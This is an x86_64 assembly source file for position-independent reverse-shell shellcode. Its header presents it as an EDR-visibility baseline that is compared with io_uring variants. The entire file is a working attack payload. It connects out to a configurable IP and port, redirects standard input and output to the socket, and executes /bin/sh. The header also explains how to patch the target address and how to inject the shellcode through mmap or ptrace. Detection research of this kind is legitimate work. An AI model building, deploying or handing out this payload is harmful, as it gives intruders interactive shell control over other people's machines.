; ================================================================
; connect_back_sys.asm — pure-syscall reverse shell (NO io_uring)
;
; Author : Maycon Vitali (@maycon) — github.com/maycon
; License: MIT — for authorized testing only
;
; THE EDR-BASELINE COUNTERPART of the io_uring missions.
; Purpose: run this under falco / strace / run_matrix.sh and compare
; what's visible vs. the uring variants. This shellcode is fully
; visible to sys_enter-based monitors:
;   socket → connect → dup2 ×3 → execve → (child) cmd execs
;   — every syscall, in the clear.
;
; THE POINT OF COMPARISON (run both, differ in ONE thing):
;   uring variant    : strace/falco sees only io_uring_setup/enter
;   this variant     : strace/falco sees socket+connect+dup2+execve
;
; Build (standalone — no build system needed):
;   nasm -f bin -o cbsys.bin connect_back_sys.asm
;
; Test via the repo runner (loopback, no root, no ptrace):
;   python3 testing/c2_server.py --port 4444 --timeout 25   # or: nc -lvnp 4444
;   ./testing/runner cbsys.bin
;   (the runner scans the LAST 25% of the blob for the 127.0.0.1:4444
;    sentinel — keep _config_ip/_config_port adjacent at the very end)
;
; Running it your own way (mmap RWX + call, ptrace injection, etc.):
;   the config bytes at the end are plain data — patch bytes 119..123
;   (ip at 119, port at 123, network order) for other targets.
;
; Size       : ~125 bytes
; Null bytes : 8 (data-contiguous, ptrace-injection-safe):
;     ~28-30, ~43-45 : RIP-relative disp32 to the config blob
;                      (unavoidable forward data refs)
;     ~120, ~121     : the two 0x00 octets of 127.0.0.1 (network order)
; Position-independent: yes (RIP-relative data access + stack-built strings)
; Kernel     : any x86_64 Linux (no uring version deps — good baseline
;              also for kernels < 5.5 where the uring socket op is absent)
; ================================================================

BITS 64

; ----------------------------------------------------------------
; Syscall numbers (x86_64)
; ----------------------------------------------------------------
SYS_SOCKET      equ 41
SYS_CONNECT     equ 42
SYS_DUP2        equ 33
SYS_EXECVE      equ 59
SYS_EXIT        equ 60

; ----------------------------------------------------------------
; Entry
; ----------------------------------------------------------------

; ---- 1. socket(AF_INET=2, SOCK_STREAM=1, protocol=0) ----
    push 0x02
    pop  rdi                    ; AF_INET
    push 0x01
    pop  rsi                    ; SOCK_STREAM
    xor  edx, edx               ; protocol = 0
    push 0x29                   ; SYS_SOCKET = 41 (no null bytes)
    pop  rax
    syscall                     ; fd in rax
    test eax, eax
    js   _fail                  ; socket() failed
    xchg rax, rdi               ; rdi = fd

; ---- 2. build sockaddr_in on the stack, then connect ----
;   struct sockaddr_in { u16 fam=2; u16 port(BE); u32 ip; u8 zero[8]; }
;   Registers carry the bytes so the instruction stream stays null-free;
;   only the unavoidable IP-octet-zeroes of 127.0.0.1 stay in the data
;   blob (patchable offset, marked NULLBYTE below).
;
;   Stack order matters: the LAST push lands at rsp+0 (the sockaddr
;   start), so sin_zero goes FIRST and fam|port|ip goes LAST. Pushing
;   them the other way around yields sa_family=0 (AF_UNSPEC) — connect
;   succeeds without connecting and the shell 'reads' a dead socket.
    xor  r10, r10
    push r10                         ; [rsp+8..15] sin_zero (pushed FIRST)
    mov  r9d, [rel _config_ip]       ; 127.0.0.1 little-endian = 0x0100007F
    shl  r9, 32                      ; align: b4..b7 = 7f 00 00 01
    movzx r8, word [rel _config_port]; 0x5C11 (BE 0x115c, little-read)
    shl  r8, 16                      ; b2..b3 = 11 5c (port in network order)
    xor  rax, rax
    mov  al, 0x02                    ; b0 = family = AF_INET (b1 already 0)
    or   rax, r9                     ; fold IP into place
    or   rax, r8                     ; fold port into place
    push rax                         ; [rsp+0..7]  fam|port|ip (pushed LAST)
    mov  rsi, rsp                    ; sockaddr* = rsp
    push 0x10
    pop  rdx                         ; addrlen = sizeof(sockaddr_in) = 16
    push 0x2a                        ; SYS_CONNECT = 42 (no null bytes)
    pop  rax
    syscall
    test eax, eax
    js   _fail                       ; connect() failed (refused / unreachable)

; ---- 3. dup2(fd → stdin/stdout/stderr), SYS_DUP2 = 33 ----
;   Most significant fd first (2), walking down with one `dec`:
    push 0x02
    pop  rsi                    ; new_fd starts at 2
_dup2_loop:
    push 0x21                   ; SYS_DUP2 = 33 (no null bytes)
    pop  rax
    syscall                     ; dup2(fd, esi)
    dec  esi                    ; 2 → 1 → 0 → -1
    jns  _dup2_loop             ; stop when esi goes negative

; ---- 4. execve("/bin//sh", argv, NULL), SYS_EXECVE = 59 ----
;   "/bin//sh" = 2f 62 69 6e 2f 2f 73 68 — no zero bytes anywhere, and it
;   fills exactly one qword: a zero byte for the NUL terminator has to
;   come from its OWN slot (a zeroed qword pushed BEFORE the string —
;   otherwise the 8-length string reads past 'h' into stack garbage,
;   which produced execve("/bin//sh\2") → ENOENT).
    mov  rax, 0x68732f2f6e69622f ; "/bin//sh" reversed push
    xor  edx, edx                ; envp = NULL (and NUL-byte donor)
    push rdx                     ; [rsp+8..15] zero qword = the string's NUL
    push rax                     ; [rsp+0..7]  "/bin//sh"
    mov  rdi, rsp                ; pathname = stack copy
    push rdx                     ; argv[1] = NULL terminator
    push rdi                     ; argv[0] = path
    mov  rsi, rsp                ; argv = { path, NULL }
    push 0x3b                    ; SYS_EXECVE = 59 (no null bytes)
    pop  rax
    syscall
    ; execve never returns on success

; ---- failure exit — always exit(1) so tests can distinguish ----
_fail:
    push 0x01
    pop  rdi                     ; status = 1
    push 0x3c                    ; SYS_EXIT = 60 (no null bytes)
    pop  rax
    syscall

; ================================================================
; Patchable configuration — data AT THE END so testing/runner's
; sentinel scan (last 25% of binary) and extract.py locate it.
;   _config_ip : 4 bytes, network byte order  (default 127.0.0.1)
;   _config_port: 2 bytes, network byte order (default 4444)
; MUST stay adjacent (ip immediately followed by port).
; ================================================================

; ---- connect sockaddr_in — 127.0.0.1 (loopback for testing) ----
_config_ip:
    db 127, 0, 0, 1             ; NULLBYTE x2: 0.0 octets (data, unavoidable)

_config_port:
    db 0x11, 0x5c               ; 4444 in network byte order
